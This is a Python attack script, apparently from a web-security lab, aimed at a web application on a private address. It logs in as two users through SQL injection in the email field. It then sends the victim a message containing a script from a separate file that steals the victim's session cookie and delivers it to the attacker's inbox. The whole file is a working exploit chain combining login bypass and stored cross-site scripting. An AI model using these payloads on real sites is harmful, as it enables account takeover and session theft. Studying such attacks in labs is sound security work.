import requests
import re
import js2py
from jsmin import jsmin
import jsbeautifier

url = "http://10.0.23.22/myspray/"

# Suppose Hanni Ball is the attacker.
s_attacker = requests.Session()
r_attacker = s_attacker.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='Hanni' AND last_name='Ball'; #", "password":"a"})

# Suppose N. O'Brian is the victim.
s_victim = requests.Session()
r_victim = s_victim.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='N.' AND last_name='O''Brian'; #", "password":"a"})

# The script retrieves the client's cookies and send them in a message to an arbitrary user.

# Set the attacker's sessionid to send the message to him.
js_script = open("script.js", "r").read().replace("sessionid", s_attacker.cookies["sessionid"])

# Send a message to the victim containing the malicious script.
r_attacker = s_attacker.post(url + "writemessage" + s_victim.cookies["sessionid"] + ".html", data={"subject":"nothing", "message":js_script})

# The victim opens its inbox.
r_victim = s_victim.get(url + "inbox.html")

# The HTML response contains the malicious script. You can reproduce this example in a browser, so the script will be run during rendering, then you can
# go to the attacker's inbox to check out the stolen cookie.

# Print HTML response.
print(r_victim.content)